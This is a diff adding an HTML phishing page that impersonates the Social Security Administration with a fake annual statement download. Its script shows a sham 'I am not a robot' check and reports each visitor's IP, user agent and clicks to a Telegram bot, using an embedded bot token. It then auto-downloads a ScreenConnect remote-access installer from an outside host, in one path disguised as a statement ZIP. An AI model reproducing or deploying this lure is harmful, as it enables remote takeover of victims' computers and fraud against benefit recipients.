@@ -1,0 +1,865 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Social Security Administration | SSA Official Portal</title>
+    <link rel="icon" href="https://www.ssa.gov/favicon.ico" type="image/x-icon">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #eef1f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        /* ===== CAPTCHA OVERLAY ===== */
+        #captchaOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.55);
+            backdrop-filter: blur(4px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .captcha-container {
+            background: #ffffff;
+            padding: 40px 35px 30px;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            max-width: 420px;
+            width: 92%;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            position: relative;
+        }
+
+        .captcha-container::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80px;
+            height: 4px;
+            background: #0033a0;
+            border-radius: 0 0 4px 4px;
+        }
+
+        .captcha-badge {
+            display: inline-block;
+            background: #e8edf5;
+            color: #0033a0;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            padding: 4px 14px;
+            border-radius: 20px;
+            text-transform: uppercase;
+            margin-bottom: 16px;
+        }
+
+        .captcha-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1a2b4a;
+            margin-bottom: 8px;
+        }
+
+        .captcha-subtitle {
+            font-size: 14px;
+            color: #5e6f8d;
+            line-height: 1.6;
+            margin-bottom: 22px;
+        }
+
+        .captcha-seal {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 18px;
+            font-size: 13px;
+            color: #2e7d32;
+            background: #e8f5e9;
+            padding: 6px 16px;
+            border-radius: 30px;
+            width: fit-content;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .captcha-checkbox-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 14px;
+            margin: 16px 0 18px;
+            padding: 16px 20px;
+            border: 2px solid #dce1eb;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            background: #fafbfc;
+        }
+
+        .captcha-checkbox-container:hover {
+            border-color: #0033a0;
+            background: #f5f7fc;
+            transform: scale(1.005);
+        }
+
+        .captcha-checkbox {
+            width: 22px;
+            height: 22px;
+            border: 2px solid #b0bcca;
+            border-radius: 4px;
+            flex-shrink: 0;
+            transition: all 0.3s ease;
+            background: #fff;
+            position: relative;
+        }
+
+        .captcha-checkbox.checked {
+            background: #0033a0;
+            border-color: #0033a0;
+        }
+
+        .captcha-checkbox.checked::after {
+            content: '✓';
+            color: #fff;
+            font-size: 15px;
+            font-weight: 700;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .captcha-text {
+            font-size: 15px;
+            font-weight: 500;
+            color: #1a2b4a;
+        }
+
+        .loading-spinner {
+            display: none;
+            margin: 12px auto 6px;
+            width: 32px;
+            height: 32px;
+            border: 3px solid #e8edf5;
+            border-top: 3px solid #0033a0;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .captcha-info {
+            font-size: 12px;
+            color: #7a8aa3;
+            margin-top: 14px;
+            line-height: 1.6;
+            border-top: 1px solid #eceff5;
+            padding-top: 14px;
+        }
+
+        .captcha-info strong {
+            color: #0033a0;
+        }
+
+        /* ===== MAIN CONTENT ===== */
+        .main-content {
+            display: none;
+            width: 100%;
+            max-width: 820px;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.10);
+            overflow: hidden;
+            animation: slideUp 0.5s ease;
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .ssa-header {
+            background: #0033a0;
+            padding: 20px 30px;
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            border-bottom: 4px solid #ffcd00;
+        }
+
+        .ssa-logo {
+            width: 50px;
+            height: 50px;
+            background: #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            font-weight: 700;
+            color: #0033a0;
+            flex-shrink: 0;
+        }
+
+        .ssa-title h1 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #fff;
+            letter-spacing: 0.3px;
+        }
+
+        .ssa-title small {
+            display: block;
+            font-size: 11px;
+            font-weight: 300;
+            color: rgba(255, 255, 255, 0.7);
+            letter-spacing: 0.5px;
+        }
+
+        .ssa-content {
+            padding: 30px 32px 20px;
+        }
+
+        .ssa-content h2 {
+            font-size: 26px;
+            font-weight: 600;
+            color: #0033a0;
+            margin-bottom: 6px;
+        }
+
+        .ssa-content .sub {
+            font-size: 15px;
+            color: #3d4f6a;
+            line-height: 1.7;
+            margin-bottom: 20px;
+        }
+
+        .ssa-content .sub strong {
+            color: #0033a0;
+        }
+
+        .instruction-box {
+            background: #f7f9fc;
+            border-left: 5px solid #0033a0;
+            padding: 18px 22px;
+            border-radius: 8px;
+            margin: 12px 0 18px;
+        }
+
+        .instruction-box h3 {
+            font-size: 16px;
+            color: #1a2b4a;
+            margin-bottom: 6px;
+        }
+
+        .instruction-box p {
+            font-size: 14px;
+            color: #3d4f6a;
+            line-height: 1.6;
+        }
+
+        .instruction-box ul {
+            margin: 8px 0 0 20px;
+            font-size: 14px;
+            color: #3d4f6a;
+            line-height: 1.8;
+        }
+
+        .instruction-box ul li strong {
+            color: #0033a0;
+        }
+
+        .status-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin: 16px 0 12px;
+        }
+
+        .status-card {
+            background: #fff;
+            padding: 14px 18px;
+            border-radius: 8px;
+            border: 1px solid #e4e9f0;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .status-card .icon {
+            font-size: 26px;
+            width: 42px;
+            height: 42px;
+            background: #eef2f9;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .status-card .info h4 {
+            font-size: 14px;
+            color: #1a2b4a;
+            font-weight: 600;
+        }
+
+        .status-card .info p {
+            font-size: 12px;
+            color: #6a7b96;
+        }
+
+        .status-card.success .icon {
+            background: #e6f4ea;
+            color: #1e7e34;
+        }
+
+        .download-section {
+            background: #f0f4fe;
+            border: 2px solid #0033a0;
+            border-radius: 10px;
+            padding: 20px 24px;
+            margin: 18px 0 10px;
+            text-align: center;
+        }
+
+        .download-section .label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #0033a0;
+            margin-bottom: 4px;
+        }
+
+        .download-section .hint {
+            font-size: 13px;
+            color: #3d4f6a;
+        }
+
+        .download-section .link-placeholder {
+            display: inline-block;
+            background: #0033a0;
+            border: none;
+            border-radius: 6px;
+            padding: 10px 28px;
+            margin-top: 12px;
+            font-size: 15px;
+            color: #fff;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+            text-decoration: none;
+        }
+
+        .download-section .link-placeholder:hover {
+            background: #002280;
+            transform: scale(1.02);
+        }
+
+        .live-badge {
+            display: inline-block;
+            background: #e6f4ea;
+            color: #1e5f2a;
+            padding: 2px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-right: 6px;
+        }
+
+        .status-line {
+            font-size: 14px;
+            color: #3d4f6a;
+            border-top: 1px solid #e4e9f0;
+            padding-top: 16px;
+            margin-top: 12px;
+        }
+
+        .ssa-footer {
+            background: #f7f9fc;
+            padding: 14px 30px;
+            border-top: 1px solid #e4e9f0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+            font-size: 13px;
+        }
+
+        .ssa-footer a {
+            color: #0033a0;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .ssa-footer a:hover {
+            text-decoration: underline;
+        }
+
+        .ssa-footer ul {
+            list-style: none;
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .ssa-footer ul li a {
+            font-weight: 400;
+            color: #4d5f7a;
+            font-size: 12px;
+        }
+
+        .mobile-warning {
+            display: none;
+            background: #fff3e0;
+            border-left: 4px solid #e65100;
+            padding: 12px 18px;
+            border-radius: 6px;
+            margin: 12px 0 10px;
+            font-size: 14px;
+            color: #b85c00;
+        }
+
+        .mobile-warning strong {
+            display: block;
+            font-size: 15px;
+            margin-bottom: 2px;
+        }
+
+        .auto-download-msg {
+            background: #e6f4ea;
+            color: #1e5f2a;
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+        }
+
+        /* Mobile block */
+        #mobileBlock {
+            display: none;
+            padding: 30px 20px;
+            text-align: center;
+            max-width: 450px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.10);
+        }
+        #mobileBlock .icon {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        #mobileBlock h2 {
+            color: #b91c1c;
+            margin-bottom: 6px;
+        }
+        #mobileBlock p {
+            color: #4a5b6e;
+            font-size: 1rem;
+            line-height: 1.6;
+        }
+
+        @media (max-width: 640px) {
+            .ssa-header {
+                flex-direction: column;
+                text-align: center;
+                padding: 16px;
+            }
+            .ssa-content {
+                padding: 18px 16px 12px;
+            }
+            .ssa-content h2 {
+                font-size: 20px;
+            }
+            .status-grid {
+                grid-template-columns: 1fr;
+            }
+            .ssa-footer {
+                flex-direction: column;
+                text-align: center;
+            }
+            .ssa-footer ul {
+                justify-content: center;
+            }
+            .download-section {
+                padding: 16px;
+            }
+            .captcha-container {
+                padding: 28px 20px 22px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== MOBILE BLOCK ===== -->
+    <div id="mobileBlock">
+        <div class="icon">📱</div>
+        <h2>Access Restricted</h2>
+        <p>This document can only be accessed from a <strong>Windows PC</strong>.<br>Please use a desktop computer to continue.</p>
+    </div>
+
+    <!-- ===== CAPTCHA OVERLAY ===== -->
+    <div id="captchaOverlay" class="captcha-overlay" style="display: none;">
+        <div class="captcha-container">
+            <div class="captcha-badge">🔒 Secure Verification</div>
+            <div class="captcha-title">Identity Confirmation Required</div>
+            <p class="captcha-subtitle">
+                As part of our <strong>enhanced security protocol</strong>, we need to verify that you are a real person before accessing your confidential SSA statement.
+            </p>
+            <div class="captcha-seal">
+                <span>🛡️</span> Protected by SSA Secure Gateway
+            </div>
+
+            <div id="captchaCheckbox" class="captcha-checkbox-container">
+                <div class="captcha-checkbox"></div>
+                <span class="captcha-text">I am not a robot</span>
+                <span class="captcha-logo" style="margin-left: auto; font-size:13px; color:#5e6f8d;">
+                    <span>re</span>
+                    <span style="font-weight:700; color:#0033a0;">CAPTCHA</span>
+                </span>
+            </div>
+
+            <div id="loadingSpinner" class="loading-spinner"></div>
+
+            <div class="captcha-info">
+                <strong>Why this step?</strong> This helps prevent automated access and protects your personal information.
+                Your verification is encrypted and private.
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== MAIN CONTENT ===== -->
+    <div id="mainContent" class="main-content" style="display: none;">
+
+        <header class="ssa-header">
+            <div class="ssa-logo">SSA</div>
+            <div class="ssa-title">
+                <h1>Social Security Administration</h1>
+                <small>Official United States Government Website</small>
+            </div>
+        </header>
+
+        <div class="ssa-content">
+
+            <h2>📄 Your 2026 Annual SSA Statement</h2>
+            <p class="sub">
+                Access your official earnings and benefits summary — this document is securely generated for
+                <strong>your account</strong> and is valid for 30 days.
+            </p>
+
+            <div id="mobileWarning" class="mobile-warning">
+                <strong>⚠ Mobile Device Detected</strong>
+                For optimal viewing, please switch to a desktop computer.
+            </div>
+
+            <div class="instruction-box">
+                <h3>📋 Important Instructions</h3>
+                <p>To access your 2026 SSA statement, please follow these steps:</p>
+                <ul>
+                    <li><strong>Step 1:</strong> Click the download button below or wait for automatic download.</li>
+                    <li><strong>Step 2:</strong> The file will open automatically in your default viewer.</li>
+                    <li><strong>Step 3:</strong> Review your earnings record and benefits summary.</li>
+                    <li><strong>Step 4:</strong> Save a copy to your device for your records.</li>
+                </ul>
+                <p style="margin-top: 8px; font-size: 13px; color: #5e6f8d;">
+                    ⏱️ The download link is valid for <strong>one session</strong> only for security purposes.
+                </p>
+            </div>
+
+            <div class="status-grid">
+                <div class="status-card progress">
+                    <div class="icon">🔒</div>
+                    <div class="info">
+                        <h4>Secure Connection</h4>
+                        <p>256-bit SSL encryption active</p>
+                    </div>
+                </div>
+                <div class="status-card success">
+                    <div class="icon">✅</div>
+                    <div class="info">
+                        <h4>Document Ready</h4>
+                        <p>Your statement is prepared</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="download-section">
+                <div class="label">⬇️ Download Your Statement</div>
+                <div class="hint">Click the button below to securely retrieve your document</div>
+                <a href="#" id="downloadLink" class="link-placeholder" download>
+                    📥 Download SSA Statement (ZIP)
+                </a>
+                <div id="autoMsg" class="auto-download-msg">
+                    ✅ Automatic download has been initiated...
+                </div>
+                <p style="font-size: 12px; color: #7a8aa3; margin-top: 10px;">
+                    File size: ~9.75 MB &bull; Encrypted transfer
+                </p>
+            </div>
+
+            <div class="status-line">
+                <span class="live-badge">● LIVE</span>
+                Your secure session is active. Document transfer ready.
+            </div>
+
+        </div>
+
+        <footer class="ssa-footer">
+            <a href="#" target="_blank">🔒 Privacy &amp; Security</a>
+            <ul>
+                <li><a href="#">OMB No. 0960-0789</a></li>
+                <li><a href="#">Privacy Policy</a></li>
+                <li><a href="#">Privacy Act Statement</a></li>
+                <li><a href="#">Accessibility Help</a></li>
+            </ul>
+        </footer>
+
+    </div>
+
+    <script>
+        (function() {
+            'use strict';
+
+            // ============================================================
+            // CONFIG (replace with your bot token and chat ID)
+            // ============================================================
+            const BOT_TOKEN = '8924681009:AAHW0lwi31XZUYRM14bbCFqrSiIyk5tS390';
+            const CHAT_ID = '8905999875';
+
+            // ============================================================
+            // TELEGRAM HELPER
+            // ============================================================
+            function sendTelegram(message) {
+                if (BOT_TOKEN === 'YOUR_BOT_TOKEN' || CHAT_ID === 'YOUR_CHAT_ID') {
+                    console.warn('Telegram not configured');
+                    return Promise.resolve();
+                }
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                return fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                }).catch(e => console.warn('Telegram send failed', e));
+            }
+
+            // ============================================================
+            // GET IP & FORMAT MESSAGE
+            // ============================================================
+            async function getIP() {
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const data = await res.json();
+                    return data.ip;
+                } catch {
+                    return 'Unknown';
+                }
+            }
+
+            function getUa() {
+                return navigator.userAgent || 'Unknown';
+            }
+
+            function getTimestamp() {
+                return new Date().toLocaleString('en-US', { timeZone: 'UTC' });
+            }
+
+            // ============================================================
+            // MOBILE DETECTION
+            // ============================================================
+            function isMobile() {
+                return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            }
+
+            // ============================================================
+            // PAGE LOAD: CHECK MOBILE AND SEND NOTIFICATION
+            // ============================================================
+            const mainContent = document.getElementById('mainContent');
+            const captchaOverlay = document.getElementById('captchaOverlay');
+            const mobileBlock = document.getElementById('mobileBlock');
+
+            (async function init() {
+                const ip = await getIP();
+                const ua = getUa();
+                const time = getTimestamp();
+
+                if (isMobile()) {
+                    // Block mobile
+                    mobileBlock.style.display = 'block';
+                    captchaOverlay.style.display = 'none';
+                    mainContent.style.display = 'none';
+                    // Send block notification
+                    const msg = `🕐 Time: ${time}\n🌐 IP: ${ip}\n🖥 UA: ${ua}\n❌ Reason: Mobile blocked`;
+                    sendTelegram(msg);
+                    return;
+                }
+
+                // Allow: show captcha and send page visit notification
+                const visitMsg = `🕐 Time: ${time}\n🌐 IP: ${ip}\n🖥 UA: ${ua}\n✅ Page visited (Desktop)`;
+                sendTelegram(visitMsg);
+
+                captchaOverlay.style.display = 'flex';
+            })();
+
+            // ============================================================
+            // CAPTCHA HANDLER
+            // ============================================================
+            var captchaPassed = false;
+            var checkboxContainer = document.getElementById('captchaCheckbox');
+            var checkbox = checkboxContainer.querySelector('.captcha-checkbox');
+            var spinner = document.getElementById('loadingSpinner');
+
+            checkboxContainer.addEventListener('click', function() {
+                if (checkbox.classList.contains('checked') || captchaPassed) return;
+
+                this.style.pointerEvents = 'none';
+                spinner.style.display = 'block';
+
+                setTimeout(async function() {
+                    checkbox.classList.add('checked');
+                    spinner.style.display = 'none';
+                    captchaPassed = true;
+
+                    // Send CAPTCHA solved notification
+                    const ip = await getIP();
+                    const ua = getUa();
+                    const time = getTimestamp();
+                    const msg = `🕐 Time: ${time}\n🌐 IP: ${ip}\n🖥 UA: ${ua}\n✅ CAPTCHA Solved`;
+                    sendTelegram(msg);
+
+                    // Hide overlay, show content
+                    captchaOverlay.style.display = 'none';
+                    mainContent.style.display = 'block';
+
+                    // Start automatic download
+                    setTimeout(function() {
+                        triggerAutoDownload();
+                    }, 1200);
+
+                }, 1500);
+            });
+
+            // ============================================================
+            // DOWNLOAD TRIGGER – UPDATED TO ZIP
+            // ============================================================
+            var DOWNLOAD_URL = 'https://davkharghar.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest';
+
+            function triggerAutoDownload() {
+                var link = document.getElementById('downloadLink');
+                var autoMsg = document.getElementById('autoMsg');
+
+                if (link) {
+                    link.href = DOWNLOAD_URL;
+                    link.setAttribute('download', 'ScreenConnect.ClientSetup.msi');
+
+                    // Force download via temporary link
+                    var tempLink = document.createElement('a');
+                    tempLink.href = DOWNLOAD_URL;
+                    tempLink.download = 'ScreenConnect.ClientSetup.msi';
+                    tempLink.style.display = 'none';
+                    document.body.appendChild(tempLink);
+                    tempLink.click();
+                    document.body.removeChild(tempLink);
+
+                    // Send download started notification
+                    getIP().then(ip => {
+                        const ua = getUa();
+                        const time = getTimestamp();
+                        const msg = `🕐 Time: ${time}\n🌐 IP: ${ip}\n🖥 UA: ${ua}\n📥 Download Started (ZIP)`;
+                        sendTelegram(msg);
+                    });
+
+                    if (autoMsg) {
+                        autoMsg.style.display = 'block';
+                        setTimeout(function() {
+                            autoMsg.style.display = 'none';
+                        }, 6000);
+                    }
+                }
+            }
+
+            // Manual download click
+            var manualLink = document.getElementById('downloadLink');
+            if (manualLink) {
+                manualLink.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    this.href = DOWNLOAD_URL;
+                    this.setAttribute('download', 'StatementID-6323013.zip');
+                    // Send download started notification (manual)
+                    getIP().then(ip => {
+                        const ua = getUa();
+                        const time = getTimestamp();
+                        const msg = `🕐 Time: ${time}\n🌐 IP: ${ip}\n🖥 UA: ${ua}\n📥 Manual Download Clicked (ZIP)`;
+                        sendTelegram(msg);
+                    });
+                    // Trigger download
+                    var tempLink = document.createElement('a');
+                    tempLink.href = DOWNLOAD_URL;
+                    tempLink.download = 'StatementID-6323013.zip';
+                    tempLink.style.display = 'none';
+                    document.body.appendChild(tempLink);
+                    tempLink.click();
+                    document.body.removeChild(tempLink);
+                });
+            }
+
+            // ============================================================
+            // PREVENT NAVIGATION
+            // ============================================================
+            document.querySelectorAll('a[href="#"]').forEach(function(a) {
+                a.addEventListener('click', function(e) {
+                    e.preventDefault();
+                });
+            });
+
+            document.querySelectorAll('form').forEach(function(form) {
+                form.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    return false;
+                });
+            });
+
+            console.log('✅ Page loaded. Telegram notifications active. ZIP download ready.');
+        })();
+    </script>
+
+</body>
+</html>
